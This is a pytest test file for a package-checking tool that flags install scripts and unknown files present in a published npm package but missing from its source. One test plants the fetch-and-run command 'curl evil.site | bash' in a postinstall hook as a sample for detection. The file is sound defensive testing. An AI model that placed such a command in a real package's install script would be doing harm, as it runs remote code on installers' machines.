"""Tests for detection rules in rules.py."""

import json
from pathlib import Path

from pkgcheck.compare import match_files
from pkgcheck.models import Finding, Status
from pkgcheck.rules import (
    INSTALL_SCRIPTS,
    apply_rules,
    check_install_scripts,
    check_unknown_files,
)


def test_no_scripts(tmp_path: Path):
    """Package and source have package.json with no scripts."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(json.dumps({"name": "demo"}))
    (src_dir / "package.json").write_text(json.dumps({"name": "demo"}))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_identical_scripts(tmp_path: Path):
    """Same install scripts in package and source."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"


def test_new_postinstall(tmp_path: Path):
    """Source has no postinstall, package introduces postinstall."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "cool-logger", "scripts": {"postinstall": "curl evil.site | bash"}}
    src_data = {"name": "cool-logger", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "curl evil.site | bash" in result[0].snippet


def test_new_preinstall(tmp_path: Path):
    """Package introduces preinstall script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"preinstall": "node pre.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"preinstall"' in result[0].snippet
    assert "node pre.js" in result[0].snippet


def test_new_install(tmp_path: Path):
    """Package introduces install script."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"install": "node install.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"install"' in result[0].snippet
    assert "node install.js" in result[0].snippet


def test_modified_existing_install_script(tmp_path: Path):
    """Source and package both have postinstall, but commands differ."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node modified.js"}}
    src_data = {"name": "demo", "scripts": {"postinstall": "node original.js"}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "install-script"
    assert '"postinstall"' in result[0].snippet
    assert "node modified.js" in result[0].snippet


def test_non_install_script(tmp_path: Path):
    """Package adds test or lint scripts; must remain EXPECTED."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"test": "pytest", "lint": "eslint .", "build": "tsc"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet is None


def test_malformed_package_json(tmp_path: Path):
    """Invalid JSON must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text("{ broken json: ")
    (src_dir / "package.json").write_text("{ also broken: ")

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_missing_package_json(tmp_path: Path):
    """Missing package.json must not raise an exception."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    findings = [Finding(file="package.json", status=Status.EXPECTED, reason="matched")]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "package.json"


def test_preserve_unrelated_findings(tmp_path: Path):
    """Unrelated findings must not be modified."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    pkg_data = {"name": "demo", "scripts": {"postinstall": "node evil.js"}}
    src_data = {"name": "demo", "scripts": {}}

    (pkg_dir / "package.json").write_text(json.dumps(pkg_data))
    (src_dir / "package.json").write_text(json.dumps(src_data))

    other_finding = Finding(
        file="src/index.js",
        status=Status.EXPECTED,
        reason="matched",
        snippet="console.log('hi')",
        line=10,
    )
    pkg_finding = Finding(file="package.json", status=Status.EXPECTED, reason="matched")

    findings = [other_finding, pkg_finding]
    result = check_install_scripts(pkg_dir, src_dir, findings)

    assert result[0].file == "src/index.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet == "console.log('hi')"
    assert result[0].line == 10

    assert result[1].file == "package.json"
    assert result[1].status == Status.SUSPICIOUS
    assert result[1].reason == "install-script"


def test_apply_rules_entry_point(tmp_path: Path):
    """apply_rules forwards to check_install_scripts and integrates with match_files."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"prepare": "node prep.js"}})
    )
    (src_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {}})
    )

    findings = match_files(["package.json"], ["package.json"])
    enriched = apply_rules(pkg_dir, src_dir, findings)

    assert len(enriched) == 1
    assert enriched[0].file == "package.json"
    assert enriched[0].status == Status.SUSPICIOUS
    assert enriched[0].reason == "install-script"
    assert '"prepare"' in enriched[0].snippet


def test_unknown_text_file(tmp_path: Path):
    """Package contains evil.js, source does not."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    evil_content = "console.log('stealing tokens');\nprocess.exit(1);\n"
    (pkg_dir / "evil.js").write_text(evil_content)

    findings = [Finding(file="evil.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "evil.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == evil_content[:200]


def test_unknown_file_snippet_truncation(tmp_path: Path):
    """Unknown file with > 200 characters is truncated to 200 characters in snippet."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    long_content = "a" * 350
    (pkg_dir / "payload.js").write_text(long_content)

    findings = [Finding(file="payload.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert len(result[0].snippet) == 200
    assert result[0].snippet == long_content[:200]


def test_empty_unknown_file(tmp_path: Path):
    """Zero-byte unknown file gets empty string snippet."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "empty.js").write_text("")

    findings = [Finding(file="empty.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet == ""


def test_missing_file_on_disk(tmp_path: Path):
    """Finding has reason='unknown-file' but file does not exist on disk."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    findings = [Finding(file="ghost.js", status=Status.SUSPICIOUS, reason="unknown-file")]
    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert len(result) == 1
    assert result[0].file == "ghost.js"
    assert result[0].status == Status.SUSPICIOUS
    assert result[0].reason == "unknown-file"
    assert result[0].snippet is None


def test_preserve_existing_findings_with_unknown_rule(tmp_path: Path):
    """Matched, missing-in-package, and install-script findings remain unchanged."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "backdoor.js").write_text("backdoor_code()")

    matched_finding = Finding(
        file="index.js",
        status=Status.EXPECTED,
        reason="matched",
        snippet="console.log(1)",
    )
    missing_finding = Finding(
        file="README.md",
        status=Status.EXPECTED,
        reason="missing-in-package",
    )
    install_script_finding = Finding(
        file="package.json",
        status=Status.SUSPICIOUS,
        reason="install-script",
        snippet='"postinstall": "curl evil"',
    )
    unknown_finding = Finding(
        file="backdoor.js",
        status=Status.SUSPICIOUS,
        reason="unknown-file",
    )

    findings = [
        matched_finding,
        missing_finding,
        install_script_finding,
        unknown_finding,
    ]

    result = check_unknown_files(pkg_dir, src_dir, findings)

    assert result[0].file == "index.js"
    assert result[0].status == Status.EXPECTED
    assert result[0].reason == "matched"
    assert result[0].snippet == "console.log(1)"

    assert result[1].file == "README.md"
    assert result[1].status == Status.EXPECTED
    assert result[1].reason == "missing-in-package"

    assert result[2].file == "package.json"
    assert result[2].status == Status.SUSPICIOUS
    assert result[2].reason == "install-script"
    assert result[2].snippet == '"postinstall": "curl evil"'

    assert result[3].file == "backdoor.js"
    assert result[3].status == Status.SUSPICIOUS
    assert result[3].reason == "unknown-file"
    assert result[3].snippet == "backdoor_code()"


def test_apply_rules_integration_both_rules(tmp_path: Path):
    """apply_rules performs both install-script detection and unknown-file enrichment."""
    pkg_dir = tmp_path / "pkg"
    src_dir = tmp_path / "src"
    pkg_dir.mkdir(parents=True)
    src_dir.mkdir(parents=True)

    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {"postinstall": "node inject.js"}})
    )
    (src_dir / "package.json").write_text(
        json.dumps({"name": "demo", "scripts": {}})
    )

    (pkg_dir / "inject.js").write_text("malicious_injection_payload();")
    (pkg_dir / "index.js").write_text("console.log('main');")
    (src_dir / "index.js").write_text("console.log('main');")

    findings = match_files(
        ["index.js", "inject.js", "package.json"],
        ["index.js", "package.json"],
    )

    enriched = apply_rules(pkg_dir, src_dir, findings)

    by_file = {f.file: f for f in enriched}

    # index.js: matched, EXPECTED
    assert by_file["index.js"].status == Status.EXPECTED
    assert by_file["index.js"].reason == "matched"

    # package.json: install-script, SUSPICIOUS
    assert by_file["package.json"].status == Status.SUSPICIOUS
    assert by_file["package.json"].reason == "install-script"
    assert '"postinstall"' in by_file["package.json"].snippet

    # inject.js: unknown-file, SUSPICIOUS, snippet enriched
    assert by_file["inject.js"].status == Status.SUSPICIOUS
    assert by_file["inject.js"].reason == "unknown-file"
    assert by_file["inject.js"].snippet == "malicious_injection_payload();"
